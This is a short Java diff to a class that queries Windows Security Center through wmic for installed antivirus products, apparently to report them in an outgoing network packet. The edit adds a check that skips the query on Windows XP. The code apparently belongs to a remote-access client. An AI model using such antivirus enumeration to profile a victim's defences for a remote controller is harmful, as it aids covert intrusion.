@@ -15,7 +15,7 @@ public class Packet69InitAntivirus extends AbstractOutgoingPacket {
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {		
 		List<String> antiviruses = new ArrayList<String>();
 		
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS && !System.getProperty("os.name").toLowerCase().contains("xp")) {
 			try {
 				Process p = Runtime.getRuntime().exec(new String[] { "wmic", "/node:localhost", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "/format:list" });
 				
